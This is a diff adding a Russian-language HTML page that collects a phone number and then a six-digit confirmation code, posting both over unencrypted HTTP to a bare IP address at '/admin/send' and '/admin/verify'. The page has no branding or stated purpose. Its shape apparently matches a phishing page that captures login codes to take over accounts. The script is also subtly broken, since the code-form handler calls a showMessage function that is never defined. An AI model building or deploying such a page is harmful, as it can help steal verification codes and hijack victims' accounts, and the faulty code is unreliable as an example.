@@ -1,0 +1,153 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Форма ввода телефона</title>
+    <style>
+             body {
+            font-family: Arial, sans-serif;
+            max-width: 400px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+        .form-container {
+            display: flex;
+            flex-direction: column;
+            gap: 15px;
+        }
+        input {
+            padding: 10px;
+            font-size: 16px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+        }
+        button {
+            padding: 10px 15px;
+            background-color: #4CAF50;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 16px;
+        }
+        button:hover {
+            background-color: #45a049;
+        }
+        .message {
+            margin-top: 15px;
+            padding: 10px;
+            border-radius: 4px;
+            display: none;
+        }
+        .success {
+            background-color: #dff0d8;
+            color: #3c763d;
+            display: block;
+        }
+        .error {
+            background-color: #f2dede;
+            color: #a94442;
+            display: block;
+        }
+        .hidden {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <div id="phoneFormContainer">
+        <h1>Введите номер телефона</h1>
+        <form class="form-container" id="phoneForm">
+            <input type="tel" id="phoneNumber" placeholder="7 (XXX) XXX-XX-XX" required>
+            <button type="submit">Отправить</button>
+        </form>
+    </div>
+
+    <div id="codeFormContainer" class="hidden">
+        <h1>Введите код подтверждения</h1>
+        <form class="form-container" id="codeForm">
+            <input type="text" id="verificationCode" placeholder="XXXXXX" required maxlength="6">
+            <button type="submit">Подтвердить</button>
+        </form>
+    </div>
+
+    <div id="message" class="message"></div>
+    <script>
+        document.getElementById('phoneForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            const phoneNumber = document.getElementById('phoneNumber').value;
+            const messageDiv = document.getElementById('message');
+            
+            // Проверка номера телефона (простая валидация)
+            if (!phoneNumber.match(/^\+?[0-9\s\-\(\)]{10,20}$/)) {
+                messageDiv.textContent = 'Пожалуйста, введите корректный номер телефона';
+                messageDiv.className = 'message error';
+                return;
+            }
+            
+            // URL вашего сервера
+            const url = 'http://45.10.41.142:8080/admin/send';
+            
+            fetch(url, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({ phone: phoneNumber }),
+            })
+            .then(response => {
+                if (!response.ok) {
+                    throw new Error('Ошибка сети');
+                }
+                return response.json();
+            })
+            .then(data => {
+                // Переключаем на форму ввода кода
+                document.getElementById('phoneFormContainer').classList.add('hidden');
+                document.getElementById('codeFormContainer').classList.remove('hidden');
+            })
+            .catch(error => {
+                messageDiv.textContent = 'Произошла ошибка при отправке: ' + error.message;
+                messageDiv.className = 'message error';
+            });
+        });
+
+        // Отправка кода подтверждения
+        document.getElementById('codeForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            const code = document.getElementById('verificationCode').value;
+            const messageDiv = document.getElementById('message');
+            
+            if (!code.match(/^\d{6}$/)) {
+                showMessage('Код должен состоять из 6 цифр', 'error');
+                return;
+            }
+            
+            // Здесь URL вашего API для проверки кода
+            fetch('http://45.10.41.142:8080/admin/verify', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({ code: code }),
+            })
+            .then(response => {
+                if (!response.ok) throw new Error('Неверный код');
+                return response.json();
+            })
+            .then(data => {
+                showMessage('Номер успешно подтвержден!', 'success');
+                // Здесь можно сделать редирект или другую логику после подтверждения
+            })
+            .catch(error => {
+                // showMessage('Ошибка: ' + error.message, 'error');
+                messageDiv.textContent = 'Произошла ошибка при отправке кода: ' + error.message;
+                messageDiv.className = 'message error';
+            });
+        });
+    </script>
+</body>
+</html>
